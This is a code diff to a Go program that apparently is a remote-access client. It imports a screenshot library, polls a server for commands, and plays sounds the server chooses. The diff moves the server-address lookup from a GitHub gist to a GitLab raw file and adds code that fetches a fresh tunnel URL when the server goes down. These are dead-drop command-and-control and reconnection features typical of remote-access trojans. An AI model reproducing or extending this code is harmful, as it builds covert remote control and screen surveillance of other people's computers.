@@ -11,6 +11,8 @@ import (
 	"time"
 	"sync"
 	"github.com/vova616/screenshot"
+	"github.com/ebitengine/oto/v3"
+    "github.com/hajimehoshi/go-mp3"
 )
 
 var serverIp string = "unknown"
@@ -18,7 +20,7 @@ var userInput string = ""
 var mutex sync.Mutex
 
 func fetchTunnelURL() string {
-    resp, err := http.Get("https://gist.githubusercontent.com/Plexisity/c4748adcea3ad83d87cd8eba959f2fd3/raw/tunnel.txt")
+    resp, err := http.Get(fmt.Sprintf("https://gitlab.com/Plexisity1/tunnel-url/-/raw/main/tunnel-url.txt"))
     if err != nil {
         fmt.Println("Error fetching gist:", err)
         return ""
@@ -105,7 +107,32 @@ func fetchCommand() string {
 
 // command to play sounds the server defines built for mp3
 func playSound() {
+	file, err := os.Open("./sound.mp3")
+    if err != nil {
+        panic("opening sound.mp3 failed: " + err.Error())
+    }
 
+    decodedMp3, err := mp3.NewDecoder(file)
+    if err != nil {
+        panic("mp3.NewDecoder failed: " + err.Error())
+    }
+
+	op := &oto.NewContextOptions{}
+    op.SampleRate = 44100
+    op.ChannelCount = 2
+    op.Format = oto.FormatSignedInt16LE
+    otoCtx, readyChan, err := oto.NewContext(op)
+    if err != nil {
+        panic("oto.NewContext failed: " + err.Error())
+    }
+
+    <-readyChan
+    player := otoCtx.NewPlayer(decodedMp3)
+    player.Play()
+
+    for player.IsPlaying() {
+        time.Sleep(time.Millisecond)
+    }
 }
 
 func main() {
@@ -148,8 +175,19 @@ func main() {
 				i++
 			}
 
+
 		default:
 			time.Sleep(2 * time.Second)
+
+			if strings.HasPrefix(userInput, "error") {
+			fmt.Println("Server down, looking for new tunnel URL...")
+			tunnelURL = fetchTunnelURL()
+			time.Sleep(10 * time.Second)
+			mutex.Lock()
+			serverIp = tunnelURL
+			mutex.Unlock()
+			fmt.Println("Tunnel URL fetched:", tunnelURL)
+			}
 
 		}
 	}
